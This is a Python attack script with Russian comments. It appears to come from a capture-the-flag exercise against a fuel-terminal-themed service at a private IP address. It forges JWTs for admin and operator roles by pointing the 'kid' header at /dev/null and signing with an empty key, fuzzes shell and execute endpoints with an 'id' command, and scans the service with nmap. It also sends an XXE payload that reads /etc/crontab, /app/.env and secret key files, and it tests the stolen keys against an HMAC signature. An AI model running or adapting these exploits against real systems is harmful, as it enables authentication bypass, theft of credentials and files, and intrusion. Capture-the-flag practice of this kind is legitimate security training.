#!/usr/bin/env python3
"""round50 — Исследование порта 9000 на 192.168.242.102"""
import requests, socket, time, json, hmac as hm, hashlib, base64, struct, re

HOST = "192.168.242.102"
PORT = 9000
CASPI = f"http://{HOST}:8007"
TARGET = f"http://{HOST}:{PORT}"
S = requests.Session()

def b64u(d):
    if isinstance(d, str): d = d.encode()
    return base64.urlsafe_b64encode(d).rstrip(b'=').decode()

def jwt_forged(role="operator"):
    h = json.dumps({"alg":"HS256","typ":"JWT","kid":"/dev/null"},separators=(',',':')).encode()
    p = json.dumps({"sub":"ctf","company":"X","role":role,
        "iat":int(time.time()),"exp":int(time.time())+86400},separators=(',',':')).encode()
    m = b64u(h)+'.'+b64u(p)
    return m+'.'+b64u(hm.new(b'', m.encode(), hashlib.sha256).digest())

AUTH_OP = {"Authorization": f"Bearer {jwt_forged('operator')}"}
AUTH_ADMIN = {"Authorization": f"Bearer {jwt_forged('admin')}"}
AUTH_CARRIER = {"Authorization": f"Bearer {jwt_forged('carrier')}"}

# ============================================================
print("="*70)
print("PHASE 1: RAW TCP — ОПРЕДЕЛЯЕМ ТИП СЕРВИСА")
print("="*70)

# Подключаемся и слушаем баннер
try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5.0)
    sock.connect((HOST, PORT))

    # Ждём баннер
    try:
        banner = sock.recv(4096)
        print(f"  Баннер: {banner!r}")
        print(f"  Текст: {banner.decode('utf-8', errors='replace')}")
    except socket.timeout:
        print("  Нет баннера (ждёт ввода)")

    # Отправляем HTTP GET
    sock.sendall(b"GET / HTTP/1.1\r\nHost: " + HOST.encode() + b"\r\n\r\n")
    time.sleep(1)
    try:
        response = sock.recv(8192)
        print(f"\n  HTTP ответ ({len(response)} bytes):")
        print(f"  {response[:1000].decode('utf-8', errors='replace')}")
    except socket.timeout:
        print("  Таймаут на HTTP запрос")

    sock.close()
except Exception as e:
    print(f"  Ошибка: {e}")

# Попробуем другой вариант: отправить простой текст
print("\n  --- Пробуем текстовую команду ---")
try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5.0)
    sock.connect((HOST, PORT))

    # Ждём баннер
    try:
        banner = sock.recv(4096)
        print(f"  Баннер: {banner!r}")
    except socket.timeout:
        pass

    # Отправляем команду
    sock.sendall(b"help\n")
    time.sleep(1)
    try:
        response = sock.recv(8192)
        print(f"  Ответ на 'help': {response[:500].decode('utf-8', errors='replace')}")
    except socket.timeout:
        print("  Таймаут")

    sock.close()
except Exception as e:
    print(f"  Ошибка: {e}")

# Пробуем JSON
print("\n  --- Пробуем JSON ---")
try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5.0)
    sock.connect((HOST, PORT))

    try:
        banner = sock.recv(4096)
        print(f"  Баннер: {banner!r}")
    except socket.timeout:
        pass

    sock.sendall(b'{"action":"help"}\n')
    time.sleep(1)
    try:
        response = sock.recv(8192)
        print(f"  Ответ: {response[:500].decode('utf-8', errors='replace')}")
    except socket.timeout:
        print("  Таймаут")

    sock.close()
except Exception as e:
    print(f"  Ошибка: {e}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 2: HTTP ЗАПРОСЫ К ПОРТУ 9000")
print("="*70)

# Базовые HTTP запросы
for method_name, method_func in [("GET", S.get), ("POST", S.post), ("OPTIONS", S.options)]:
    try:
        if method_name == "POST":
            r = method_func(f"{TARGET}/", timeout=5, data="test")
        else:
            r = method_func(f"{TARGET}/", timeout=5)
        print(f"\n  {method_name} / [{r.status_code}]")
        print(f"  Headers: {dict(r.headers)}")
        print(f"  Body ({len(r.text)} bytes): {r.text[:500]}")
    except Exception as e:
        print(f"  {method_name} / : {type(e).__name__}: {str(e)[:200]}")

# С JWT авторизацией
for role, auth in [("operator", AUTH_OP), ("admin", AUTH_ADMIN), ("carrier", AUTH_CARRIER)]:
    try:
        r = S.get(f"{TARGET}/", headers=auth, timeout=5)
        print(f"\n  GET / [role={role}] [{r.status_code}]: {r.text[:300]}")
    except Exception as e:
        print(f"  GET / [role={role}]: {type(e).__name__}: {str(e)[:100]}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 3: HTTP ENDPOINTS НА ПОРТУ 9000")
print("="*70)

paths = [
    "/", "/api", "/api/", "/health", "/healthz", "/status",
    "/shell", "/llehs", "/probe", "/secret", "/flag",
    "/api/probe", "/api/shell", "/api/llehs",
    "/v1", "/v1/", "/v1/meters", "/v1/tanks",
    "/login", "/auth", "/admin", "/console",
    "/ws", "/websocket", "/socket.io",
    "/metrics", "/info", "/version",
    "/api/ops/probe/secret", "/api/ops/probe/key",
    "/api/ops/shell", "/api/ops/llehs",
    "/api/config", "/api/secrets",
    "/probe/sign", "/probe/secret",
    # gauge-gw paths (maybe this IS gauge-gw?)
    "/v1/meters/loading-arm-1/flow",
    "/v1/tanks/1/level",
    # CTF-specific
    "/flag.txt", "/secret.txt", "/key.txt",
    "/challenge", "/submit",
]

for path in paths:
    try:
        r = S.get(f"{TARGET}{path}", headers=AUTH_OP, timeout=3)
        if r.status_code != 404:
            print(f"  [{r.status_code}] {path}: {r.text[:200]}")
    except requests.exceptions.ConnectionError:
        pass
    except Exception as e:
        if "timed out" not in str(e):
            print(f"  [ERR] {path}: {type(e).__name__}: {str(e)[:100]}")

# POST endpoints
print("\n  --- POST endpoints ---")
for path in ["/", "/api", "/shell", "/llehs", "/probe", "/api/probe",
             "/api/ops/probe", "/submit", "/flag", "/api/shell",
             "/api/ops/shell", "/execute", "/run", "/cmd", "/eval"]:
    try:
        r = S.post(f"{TARGET}{path}", headers=AUTH_OP, timeout=3,
                   json={"cmd": "id", "command": "id", "action": "help"})
        if r.status_code != 404:
            print(f"  POST [{r.status_code}] {path}: {r.text[:200]}")
    except requests.exceptions.ConnectionError:
        pass
    except Exception as e:
        if "timed out" not in str(e):
            print(f"  POST [ERR] {path}: {type(e).__name__}: {str(e)[:100]}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 4: ПРОВЕРЯЕМ — ЭТО GAUGE-GW?")
print("="*70)

# Если порт 9000 = gauge-gw, попробуем подписанные URL
# gauge-gw работает на порту 9100, но может быть редирект
# Попробуем точные URL из probe sign responses

probe_urls = {
    "lm-01": "http://gauge-gw.internal:9100/v1/meters/loading-arm-1/flow",
    "tk-01": "http://gauge-gw.internal:9100/v1/tanks/1/level",
}

for device, url in probe_urls.items():
    # Подменяем gauge-gw.internal:9100 на HOST:9000
    local_url = url.replace("gauge-gw.internal:9100", f"{HOST}:{PORT}")
    try:
        r = S.get(local_url, timeout=3)
        print(f"  [{r.status_code}] {device} -> {local_url}: {r.text[:200]}")
    except Exception as e:
        print(f"  [ERR] {device}: {type(e).__name__}: {str(e)[:100]}")

# Также пробуем без порта
for path in ["/v1/meters/loading-arm-1/flow", "/v1/tanks/1/level", "/v1/tanks/2/level"]:
    try:
        r = S.get(f"{TARGET}{path}", timeout=3)
        print(f"  [{r.status_code}] {path}: {r.text[:200]}")
    except Exception as e:
        if "timed out" not in str(e):
            print(f"  [ERR] {path}: {type(e).__name__}: {str(e)[:100]}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 5: NMAP -sV ДЛЯ ОПРЕДЕЛЕНИЯ СЕРВИСА")
print("="*70)

import subprocess
try:
    result = subprocess.run(
        ["nmap", "-sV", "-p", "9000", HOST],
        capture_output=True, text=True, timeout=30
    )
    print(result.stdout)
    if result.stderr:
        print(f"  stderr: {result.stderr[:200]}")
except FileNotFoundError:
    print("  nmap не установлен")
except Exception as e:
    print(f"  Ошибка: {e}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 6: WEBSOCKET НА ПОРТУ 9000")
print("="*70)

# WebSocket upgrade request
try:
    import secrets
    ws_key = base64.b64encode(secrets.token_bytes(16)).decode()
    r = S.get(f"{TARGET}/", headers={
        "Upgrade": "websocket",
        "Connection": "Upgrade",
        "Sec-WebSocket-Key": ws_key,
        "Sec-WebSocket-Version": "13",
        "Origin": f"http://{HOST}:{PORT}",
    }, timeout=5)
    print(f"  WS upgrade: [{r.status_code}] {dict(r.headers)}")
    print(f"  Body: {r.text[:300]}")
except Exception as e:
    print(f"  WS: {type(e).__name__}: {str(e)[:200]}")

# WebSocket на /ws
try:
    r = S.get(f"{TARGET}/ws", headers={
        "Upgrade": "websocket",
        "Connection": "Upgrade",
        "Sec-WebSocket-Key": ws_key,
        "Sec-WebSocket-Version": "13",
    }, timeout=5)
    print(f"  WS /ws: [{r.status_code}] {r.text[:200]}")
except Exception as e:
    if "timed out" not in str(e):
        print(f"  WS /ws: {type(e).__name__}: {str(e)[:100]}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 7: GRPC / ПРОТОБУФ НА ПОРТУ 9000")
print("="*70)

# gRPC uses HTTP/2. Попробуем h2c upgrade
try:
    r = S.get(f"{TARGET}/", headers={
        "Upgrade": "h2c",
        "HTTP2-Settings": "",
        "Connection": "Upgrade, HTTP2-Settings",
    }, timeout=5)
    print(f"  h2c upgrade: [{r.status_code}] {r.text[:200]}")
except Exception as e:
    print(f"  h2c: {type(e).__name__}: {str(e)[:100]}")

# gRPC reflection
try:
    r = S.post(f"{TARGET}/grpc.reflection.v1alpha.ServerReflection/ServerReflectionInfo",
               headers={"Content-Type": "application/grpc"}, timeout=3)
    print(f"  gRPC reflection: [{r.status_code}] {r.text[:200]}")
except Exception as e:
    if "timed out" not in str(e):
        print(f"  gRPC: {type(e).__name__}: {str(e)[:100]}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 8: SSH НА ПОРТУ 22 — ИНТЕРЕСНО?")
print("="*70)

# SSH баннер уже получили: OpenSSH_10.2p1 Ubuntu
# Пробуем подключиться с кредами
import subprocess
# Не пробуем SSH напрямую — просто фиксируем баннер
print("  SSH: OpenSSH_10.2p1 Ubuntu-2ubuntu3.6")
print("  Возможные логины: root, admin, operator, terminal, ctf, caspi")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 9: ЧТЕНИЕ КОНФИГОВ ВНУТРИ КОНТЕЙНЕРА ЧЕРЕЗ XXE")
print("="*70)

def xxe_read(path, field="remarks"):
    xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [<!ENTITY x SYSTEM "file://{path}">]>
<ticket>
  <reference>{"&x;" if field=="reference" else "r"}</reference>
  <tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>{"&x;" if field=="carrier" else "C"}</carrier>
  <remarks>{"&x;" if field=="remarks" else "R"}</remarks>
</ticket>'''
    try:
        r = S.post(f"{CASPI}/api/ops/custody/ingest",
            data=xml, headers={**AUTH_OP, "Content-Type":"application/xml"}, timeout=15)
        if r.status_code == 200:
            try:
                d = r.json()
                return "OK", d.get("summary",{}).get(field,"")
            except:
                return "RAW", r.text[:500]
        elif r.status_code == 400:
            return "BIN", r.text[:200]
        else:
            return f"E{r.status_code}", r.text[:200]
    except Exception as e:
        return "ERR", str(e)[:150]

# Ищем конфиги, связанные с LLEHS/shell/port 9000
interesting_files = [
    # Docker compose мог создать доп. файлы
    "/.dockerenv",
    "/etc/docker/daemon.json",
    # Контейнер может знать о других сервисах
    "/etc/services",
    # Supervisord
    "/etc/supervisor/conf.d/app.conf",
    "/etc/supervisord.conf",
    # Cron
    "/etc/crontab",
    "/var/spool/cron/crontabs/root",
    # Nginx конфиг (если внутри контейнера)
    "/etc/nginx/nginx.conf",
    "/etc/nginx/conf.d/default.conf",
    # Возможные скрипты
    "/usr/local/bin/start.sh",
    "/start.sh",
    "/run.sh",
    "/init.sh",
    # Python path
    "/usr/local/lib/python3.11/site-packages/app/__init__.py",
    # Другие интересные места
    "/app/static/css/app.css",
    "/app/Dockerfile",
    "/app/docker-compose.yml",
    "/app/.env",
    "/app/config.json",
    "/app/config.yaml",
    "/app/config.toml",
    # Probe-specific
    "/app/probe_secret",
    "/app/probe_key",
    "/app/secret",
    "/app/keys/probe_secret",
    "/app/keys/secret",
    "/app/keys/hmac",
    "/app/keys/signing",
    # Entrypoint details
    "/docker-entrypoint.sh",
    "/entrypoint.sh",
]

for f in interesting_files:
    st, val = xxe_read(f)
    if st == "OK" and val:
        print(f"  [READ] {f}: {val[:300]}")
    elif st == "BIN":
        print(f"  [BIN]  {f}: exists but has forbidden chars")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 10: PROBE SECRET КАК КЛЮЧ В /app/keys/")
print("="*70)

# Может PROBE_SECRET хранится в отдельном файле ключа?
key_files = [
    "/app/keys/probe",
    "/app/keys/probe_secret",
    "/app/keys/hmac",
    "/app/keys/signing",
    "/app/keys/secret",
    "/app/keys/admin",
    "/app/keys/default",
    "/app/keys/master",
    "/app/keys/server",
    "/app/keys/app",
]

for kf in key_files:
    st, val = xxe_read(kf)
    if st == "OK" and val:
        print(f"  [KEY FOUND] {kf}: {val[:200]}")
        # Проверяем как PROBE_SECRET
        sig = hm.new(val.encode(), b"http://gauge-gw.internal:9100/v1/meters/loading-arm-1/flow",
                     hashlib.sha256).hexdigest()
        expected = "5b6fbf6d129fc68146d36bb3be3770ccd3eee953b23347115edfdc48d97d3b09"
        print(f"    HMAC test: {sig[:20]}... == {expected[:20]}... ? {'YES!!!' if sig == expected else 'no'}")
    elif st == "BIN":
        print(f"  [BIN] {kf}: exists, unreadable")

print("\n"+"="*70)
print("DONE")
print("="*70)
